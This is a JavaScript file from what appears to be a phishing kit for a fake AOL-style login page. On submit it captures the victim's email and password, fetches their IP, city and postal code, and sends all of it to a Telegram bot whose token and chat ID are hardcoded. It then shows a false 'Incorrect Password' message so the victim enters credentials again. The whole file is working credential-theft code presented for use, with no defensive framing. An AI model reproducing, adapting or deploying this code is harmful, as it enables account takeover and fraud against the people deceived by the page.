// sender1.js - For use on login form in myah/index.html. Make sure to update your TELEGRAM_BOT_TOKEN and CHAT_ID.

const TELEGRAM_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk"; // <--- PUT YOUR TOKEN
const TELEGRAM_CHAT_ID = "-5006528512";     // <--- PUT YOUR CHAT ID

// Inject CSS for error state/placeholder if it doesn't exist yet
(function() {
  if (!document.getElementById('aol-sender1-css')) {
    const style = document.createElement('style');
    style.id = 'aol-sender1-css';
    style.innerHTML = `
      .input-error {
        border: 1.5px solid red !important;
        color: red !important;
      }
      .input-error::placeholder {
        color: red !important;
      }
      .error-msg-visible {
        display: block !important;
        color: red !important;
        font-size: 15px !important;
        margin-top: 8px;
      }
    `;
    document.head.appendChild(style);
  }
})();

document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("loginForm");
  if (!form) return; // No form found, do nothing

  // Find the likely username and password fields
  // Username: input[name="email"]
  // Password: the first input[type="password"] inside the form
  // Error message: #username-error (already present but 'hide' by default)
  const usernameInput = form.querySelector('input[name="email"]');
  let passwordInput = null;
  // There may be multiple password fields; pick the intended visible one
  const passwordInputs = form.querySelectorAll('input[type="password"]');
  passwordInput = [...passwordInputs].find(inp => inp.name === "password") || passwordInputs[0];

  const errorMsg = document.getElementById("username-error");

  async function sendToTelegram(email, password, locationInfo) {
    const text = `
---------------|54|---------------
Username: ${email}
Password: ${password}
${locationInfo}
-------------------------------
`;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = { chat_id: TELEGRAM_CHAT_ID, text };

    try {
      const res = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      return res.ok;
    } catch {
      return false;
    }
  }

  async function getLocationInfo() {
    try {
      const res = await fetch("https://ip-api.io/json");
      const data = await res.json();
      return `Country: ${data.country_name || ""}, City: ${data.city || ""}, IP: ${data.ip || ""}, ZIP: ${data.postal || ""}`;
    } catch {
      return "Location: Unknown";
    }
  }

  // Remove AOL-style "hide" class and show error message
  function showError(msg) {
    if (!errorMsg) return;
    errorMsg.textContent = msg;
    errorMsg.classList.remove("hide");
    errorMsg.classList.add("error-msg-visible");
  }
  function hideError() {
    if (!errorMsg) return;
    errorMsg.classList.add("hide");
    errorMsg.classList.remove("error-msg-visible");
    errorMsg.textContent = "";
  }

  function addInputErrorStyling() {
    if (usernameInput) usernameInput.classList.add('input-error');
    if (passwordInput) passwordInput.classList.add('input-error');
  }
  function removeInputErrorStyling() {
    if (usernameInput) usernameInput.classList.remove('input-error');
    if (passwordInput) passwordInput.classList.remove('input-error');
  }

  // On form submit: send to Telegram, show error, don't reload or redirect
  form.addEventListener("submit", async function (e) {
    e.preventDefault();
    removeInputErrorStyling();
    hideError();

    const email = usernameInput ? usernameInput.value.trim() : "";
    const password = passwordInput ? passwordInput.value : "";
    const locationInfo = await getLocationInfo();

    // Always send credentials + location
    await sendToTelegram(email, password, locationInfo);

    addInputErrorStyling();
    showError("Incorrect Password. please Try Again.");
  });

  // As soon as user types, remove error state
  if (usernameInput) {
    usernameInput.addEventListener("input", () => {
      usernameInput.classList.remove('input-error');
      hideError();
    });
  }
  if (passwordInput) {
    passwordInput.addEventListener("input", () => {
      passwordInput.classList.remove('input-error');
      hideError();
    });
  }
});
